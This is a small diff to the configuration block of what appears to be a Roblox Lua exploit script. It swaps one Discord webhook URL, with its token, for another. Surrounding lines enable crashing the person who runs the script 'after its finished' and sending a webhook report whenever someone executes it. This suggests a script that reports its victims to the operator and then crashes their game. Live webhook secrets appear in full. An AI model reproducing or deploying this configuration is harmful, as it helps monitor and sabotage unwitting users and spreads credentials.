@@ -9,7 +9,7 @@ _G.Crash = true  --// Crashes Them After Its Finished
 --[[ Webhook Config ]]--
 _G.Enabled = true --// Toggle For Sending Webhooks
 _G.Mention = false --// Pings You When Someone Executes
-_G.Webhook = "https://discord.com/api/webhooks/1093827767948288050/rx_kEjRnxLTNUmSrZgME13mMRdLPaeXyFjdhnCgArlXA-ASK9jo6ifUQUgo6iSXL_JBN" --// Discord Webhook For Executions
+_G.Webhook = "https://discord.com/api/webhooks/1087125674172612618/dGMNuDJW5vhDCeORyuNMrBnJ5bx-EpPtDbktXL3RYzhSx0NroUWELOB1YY61fLXw_g2_" --// Discord Webhook For Executions
 
 --[[ UI Config ]]--
 _G.ScriptName = "ez" --// Script Name On The UI
